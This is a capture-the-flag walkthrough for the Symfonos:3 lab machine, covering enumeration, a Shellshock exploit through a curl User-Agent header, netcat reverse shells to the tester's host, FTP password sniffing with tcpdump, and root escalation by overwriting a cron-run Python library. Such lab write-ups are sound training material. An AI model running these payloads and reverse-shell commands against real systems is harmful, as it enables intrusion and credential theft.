@@ -1,0 +1,293 @@
+Symfonos:3 is the another part of symfonos.
+IP: 192.168.0.105
+Lets enumerate the system.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Symfonos3# nmap -A -T4 -p- 192.168.0.105
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 11:10 IST
+Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 11:10 (0:00:03 remaining)
+Nmap scan report for 192.168.0.105
+Host is up (0.0025s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5b
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
+|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
+|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/26%OT=21%CT=1%CU=35068%PV=Y%DS=2%DC=T%G=Y%TM=5F6ED46
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=8)OPS(
+OS:O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11
+OS:NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=ABD3%RUD=G)IE(R=Y%DFI=N%T=40%
+OS:CD=S)
+
+Network Distance: 2 hops
+
+First I will check out the ftp server and see if I can get anything related to the CTF.
+
+So I cant anonymously connect to the ftp port.
+
+I enumerate the http i.e port number - 80.
+
+Using dirb I found out a list of directories that we can browse.
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.0.105/ ----
++ http://192.168.0.105/cgi-bin/ (CODE:403|SIZE:278)                                                                                                  
+==> DIRECTORY: http://192.168.0.105/gate/                                                                                                            
++ http://192.168.0.105/index.html (CODE:200|SIZE:241)                                                                                                
++ http://192.168.0.105/server-status (CODE:403|SIZE:278)                                                                                             
+                                                                                                                                                     
+---- Entering directory: http://192.168.0.105/gate/ ----
++ http://192.168.0.105/gate/index.html (CODE:200|SIZE:202)                                                                                           
+                                                                                                                                                     
+-----------------
+END_TIME: Sat Sep 26 11:13:05 2020
+DOWNLOADED: 9224 - FOUND: 4
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Symfonos3#
+
+/gate looks interesting.
+
+
+Nothing got from /gate/,It was just a image so I thought stego can be of help overhere,but nada.
+
+Then I used gobuster for further enumeration against /gate/
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/DC4# gobuster dir -u http://192.168.0.105/gate -w directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.0.105/gate
+[+] Threads:        10
+[+] Wordlist:       directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/26 11:20:55 Starting gobuster
+===============================================================
+/cerberus (Status: 301)
+===============================================================
+2020/09/26 11:22:57 Finished
+===============================================================
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/DC4# 
+
+Wow another path..Lets check it out.
+
+
+So this is a rabbit hole and I found nothing.What a waste of time :(.
+Nvm I found out that cgi-bin is giving 403 response well thats strange so I did directory search for /cgi-bin/
+
+
+root@LAPTOP-U5913CMD:/opt/SecLists/Discovery/Web-Content# gobuster dir -u http://192.168.0.105/cgi-bin/ -w directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.0.105/cgi-bin/
+[+] Threads:        10
+[+] Wordlist:       directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/26 11:56:42 Starting gobuster
+===============================================================
+/underworld (Status: 200)
+===============================================================
+2020/09/26 11:58:45 Finished
+===============================================================
+root@LAPTOP-U5913CMD:/opt/SecLists/Discovery/Web-Content# 
+
+
+http://192.168.0.105/cgi-bin/underworld
+
+01:39:18 up 1:04, 0 users, load average: 0.00, 0.28, 1.17 
+
+
+So there is common gateway interface running.
+
+So the server is vulnerable to Shellshock.
+
+root@LAPTOP-U5913CMD:/opt/SecLists/Discovery/Web-Content# curl -H "User-Agent: () { :; }; echo; echo;  /bin/bash -c 'cat /etc/passwd'" http://192.168.0.105/cgi-bin/underworld
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+Debian-exim:x:105:109::/var/spool/exim4:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
+hades:x:1000:1000:,,,:/home/hades:/bin/bash
+cerberus:x:1001:1001:,,,:/home/cerberus:/bin/bash
+proftpd:x:108:65534::/run/proftpd:/bin/false
+ftp:x:109:65534::/srv/ftp:/bin/false
+
+
+Now we can use netcat to get a reverse shell.
+
+root@LAPTOP-U5913CMD:/opt/SecLists/Discovery/Web-Content# curl -H "User-Agent: () { :; }; echo; echo;  /bin/bash -c 'nc 192.168.0.106 1234 -e /bin/sh'" http://192.168.0.105/cgi-bin/underworld
+
+C:\Users\Voker\Downloads\netcat-win32-1.12>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.106] from (UNKNOWN) [192.168.0.105] 57258
+id
+uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
+
+To get a stable shell we can use python.
+
+python -c "import pty;pty.spawn('/bin/bash')"
+cerberus@symfonos3:/usr/lib/cgi-bin$ id
+id
+uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
+cerberus@symfonos3:/usr/lib/cgi-bin$
+
+There was something related to pcap as you can see above and I decided to capture traffic on the loopback interface.
+
+cerberus@symfonos3:/usr/lib/cgi-bin$ which tcpdump
+which tcpdump
+/usr/local/bin/tcpdump
+cerberus@symfonos3:/usr/lib/cgi-bin$ tcpdump -v -i lo port 21
+tcpdump -v -i lo port 21
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+02:10:01.144584 IP (tos 0x0, ttl 64, id 61014, offset 0, flags [DF], proto TCP (6), length 60)
+    localhost.36362 > localhost.ftp: Flags [S], cksum 0xfe30 (incorrect -> 0xd072), seq 1428316568, win 43690, options [mss 65495,sackOK,TS val 1347534 ecr 0,nop,wscale 7], length 0
+02:10:01.144649 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60)
+    localhost.ftp > localhost.36362: Flags [S.], cksum 0xfe30 (incorrect -> 0x23a3), seq 2511046448, ack 1428316569, win 43690, options [mss 65495,sackOK,TS val 1347534 ecr 1347534,nop,wscale 7], length 0
+02:10:01.144665 IP (tos 0x0, ttl 64, id 61015, offset 0, flags [DF], proto TCP (6), length 52)
+    localhost.36362 > localhost.ftp: Flags [.], cksum 0xfe28 (incorrect -> 0xf5e7), ack 1, win 342, options [nop,nop,TS val 1347534 ecr 1347534], length 0
+02:10:01.150860 IP (tos 0x0, ttl 64, id 2303, offset 0, flags [DF], proto TCP (6), length 107)
+    localhost.ftp > localhost.36362: Flags [P.], cksum 0xfe5f (incorrect -> 0x4886), seq 1:56, ack 1, win 342, options [nop,nop,TS val 1347536 ecr 1347534], length 55: FTP, length: 55
+        220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]
+02:10:01.150945 IP (tos 0x0, ttl 64, id 61016, offset 0, flags [DF], proto TCP (6), length 52)
+    localhost.36362 > localhost.ftp: Flags [.], cksum 0xfe28 (incorrect -> 0xf5ac), ack 56, win 342, options [nop,nop,TS val 1347536 ecr 1347536], length 0
+02:10:01.151016 IP (tos 0x0, ttl 64, id 61017, offset 0, flags [DF], proto TCP (6), length 64)
+    localhost.36362 > localhost.ftp: Flags [P.], cksum 0xfe34 (incorrect -> 0x66a9), seq 1:13, ack 56, win 342, options [nop,nop,TS val 1347536 ecr 1347536], length 12: FTP, length: 12
+        USER hades
+02:10:01.151022 IP (tos 0x0, ttl 64, id 2304, offset 0, flags [DF], proto TCP (6), length 52)
+    localhost.ftp > localhost.36362: Flags [.], cksum 0xfe28 (incorrect -> 0xf5a0), ack 13, win 342, options [nop,nop,TS val 1347536 ecr 1347536], length 0
+02:10:01.151851 IP (tos 0x0, ttl 64, id 2305, offset 0, flags [DF], proto TCP (6), length 85)
+    localhost.ftp > localhost.36362: Flags [P.], cksum 0xfe49 (incorrect -> 0xef44), seq 56:89, ack 13, win 342, options [nop,nop,TS val 1347536 ecr 1347536], length 33: FTP, length: 33
+        331 Password required for hades
+02:10:01.151954 IP (tos 0x0, ttl 64, id 61018, offset 0, flags [DF], proto TCP (6), length 75)
+    localhost.36362 > localhost.ftp: Flags [P.], cksum 0xfe3f (incorrect -> 0x53be), seq 13:36, ack 89, win 342, options [nop,nop,TS val 1347536 ecr 1347536], length 23: FTP, length: 23
+        PASS PTpZTfU4vxgzvRBE
+02:10:01.174784 IP (tos 0x0, ttl 64, id 2306, offset 0, flags [DF], proto TCP (6), length 78)
+    localhost.ftp > localhost.36362: Flags [P.], cksum 0xfe42 (incorrect -> 0x1ef6), seq 89:115, ack 36, win 342, options [nop,nop,TS val 1347542 ecr 1347536], length 26: FTP, length: 26
+        230 User hades logged in
+
+As you can see the User:hades 
+And Password:PTpZTfU4vxgzvRBE
+
+hades@symfonos3:/home$ find / -writable -type d 2>/dev/null
+/srv/ftp
+/usr/lib/python2.7
+/dev/mqueue
+/dev/shm
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
+/var/lib/php/sessions
+/var/tmp
+/run/user/1000
+/run/user/1000/gnupg
+/run/user/1000/systemd
+/run/user/1000/systemd/transient
+/run/lock
+/home/hades
+/home/hades/.nano
+/proc/11886/task/11886/fd
+/proc/11886/fd
+/proc/11886/map_files
+/tmp
+/tmp/.XIM-unix
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+We can remove the ftplib.py and write our own script to get a reverse shell as root.
+Set up a netcat listener for incoming connections.
+
+hades@symfonos3:/usr/lib/python2.7$ nano ftplib.py
+hades@symfonos3:/usr/lib/python2.7$ rm ftplib.py
+rm: remove write-protected regular file 'ftplib.py'? yes
+hades@symfonos3:/usr/lib/python2.7$ nano ftplib.py
+hades@symfonos3:/usr/lib/python2.7$ rm ftplib.py^C
+hades@symfonos3:/usr/lib/python2.7$ cat ftplib.py
+import os
+os.system("nc 192.168.0.106 1234 -e /bin/sh")
+hades@symfonos3:/usr/lib/python2.7$ 
+
+We wait for some time and see if we get any connection as the ftpclient.py runs on a cron job.
+
+C:\Users\Voker\Downloads\netcat-win32-1.12>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.106] from (UNKNOWN) [192.168.0.105] 57444
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+Wow nice..
+
+ls
+proof.txt
+cat proof.txt
+
+        Congrats on rooting symfonos:3!
+                                        _._
+                                      _/,__\,
+                                   __/ _/o'o
+                                 /  '-.___'/  __
+                                /__   /\  )__/_))\
+     /_/,   __,____             // '-.____|--'  \\
+    e,e / //  /___/|           |/     \/\        \\
+    'o /))) : \___\|          /   ,    \/         \\
+     -'  \\__,_/|             \/ /      \          \\
+             \_\|              \/        \          \\
+             | ||              <    '_    \          \\
+             | ||             /    ,| /   /           \\
+             | ||             |   / |    /\            \\
+             | ||              \_/  |   | |             \\
+             | ||_______________,'  |__/  \              \\
+              \|/_______________\___/______\_             \\
+               \________________________     \__           \\        ___
+                  \________________________    _\_____      \\ _____/
+                     \________________________               \\
+        ~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
+            ~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //
+
+        Contact me via Twitter @zayotic to give feedback!
+
+
+Thank you... Happy Hacking :)
+
